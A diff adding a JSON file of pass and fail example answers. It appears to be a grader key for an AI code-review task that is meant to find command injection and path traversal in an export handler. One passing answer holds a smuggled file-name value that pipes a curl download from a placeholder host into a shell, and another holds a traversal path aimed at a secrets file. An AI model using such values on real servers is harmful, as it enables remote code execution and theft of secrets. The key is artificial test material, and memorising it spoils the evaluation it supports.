@@ -1,0 +1,34 @@
+{
+  "pass": [
+    {
+      "answer": "CRITICAL: src/utils/reports.js:15 - sendExport interpolates req.query.file into `gzip -kf \"...\"` and runs it with execSync. A request with file=$(curl evil.example|sh).csv runs that command on the server: command injection.",
+      "why": "names the function and command injection"
+    },
+    {
+      "answer": "IMPORTANT src/utils/reports.js line 14: path traversal. The file parameter is joined onto /var/exports with no containment check, so file=../../etc/app/secrets.csv is read and sent.",
+      "why": "names the file and the traversal"
+    },
+    {
+      "answer": "Remote code execution through the export download: the request's file name reaches a shell in sendExport.",
+      "why": "vulnerability named before the function"
+    }
+  ],
+  "fail": [
+    {
+      "answer": "",
+      "why": "empty reply"
+    },
+    {
+      "answer": "No security-relevant surface: the change adds CRUD models, routes and services over an in-memory store, with input validation on create.",
+      "why": "skip gate taken after reading only the first page"
+    },
+    {
+      "answer": "No findings. The routes import ../utils/pagination.js and validate request bodies before they reach the services.",
+      "why": "quotes an import path, which a bare ../ pattern would pass"
+    },
+    {
+      "answer": "Here is a summary of the release notes for version 2.3.",
+      "why": "answer to a different question"
+    }
+  ]
+}
